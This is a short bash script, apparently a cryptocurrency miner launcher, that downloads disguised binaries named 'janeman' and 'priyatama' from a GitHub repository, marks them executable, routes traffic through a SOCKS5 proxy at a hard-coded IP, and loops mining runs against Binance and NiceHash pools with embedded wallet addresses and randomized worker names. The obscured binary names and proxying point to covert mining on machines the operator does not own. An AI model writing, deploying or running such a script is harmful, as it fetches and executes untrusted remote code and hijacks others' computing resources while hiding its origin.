#!/bin/bash
#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
apt install libpci3
apt install curl
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
export http_proxy=socks5://65.2.123.108:9001
curl -x "socks5://65.2.123.108:9001" ifconfig.co
curl -x "socks5://65.2.123.108:9001" ifconfig.co
curl -x "socks5://65.2.123.108:9001" ifconfig.co
curl -x "socks5://65.2.123.108:9001" ifconfig.co
#timeout 10m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
#rm -r janeman
#sleep 10
#wget https://github.com/archernap/prem/raw/main/priyatama
#chmod +x priyatama
#timeout 10m ./priyatama --algo daggerhashimoto --pool stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg)
#rm -r priyatama
sleep 5
POOL=stratum+tcp://ethash.poolbinance.com:1800
WALLET=DHB
WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
timeout 10m ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
